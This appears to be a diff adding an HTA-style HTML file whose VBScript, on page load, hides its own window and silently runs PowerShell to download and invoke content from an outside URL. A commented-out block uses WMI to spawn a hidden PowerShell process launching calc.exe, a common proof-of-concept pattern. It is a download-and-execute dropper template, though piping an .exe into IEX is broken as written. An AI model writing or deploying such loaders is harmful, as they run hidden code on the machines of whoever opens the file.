@@ -1,0 +1,32 @@
+<html>
+<head>
+<script language="VBScript">
+Sub window_onload
+    window.resizeTo 0,0
+    window.MoveTo -100,-100
+	const impersonation = 3
+	Const HIDDEN_WINDOW = 12
+	Set Locator = CreateObject("WScript.Shell")
+    Locator.Run"powershell.exe -nop -w hidden -c ""IEX (new-object net.webclient).downloadstring('https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe')""",0,FALSE
+    window.close()
+end sub
+</script>
+<!--
+
+<script language="VBScript">
+Sub window_onload
+	const impersonation = 3
+	Const HIDDEN_WINDOW = 12
+	Set Locator = CreateObject("WbemScripting.SWbemLocator")
+	Set Service = Locator.ConnectServer()
+	Service.Security_.ImpersonationLevel=impersonation
+	Set objStartup = Service.Get("Win32_ProcessStartup")
+	Set objConfig = objStartup.SpawnInstance_
+	Set Process = Service.Get("Win32_Process")
+	Error = Process.Create("powershell.exe -nop -w hidden calc.exe", null, objConfig, intProcessID)
+	window.close()
+end sub
+</script>
+-->
+</head>
+</html>
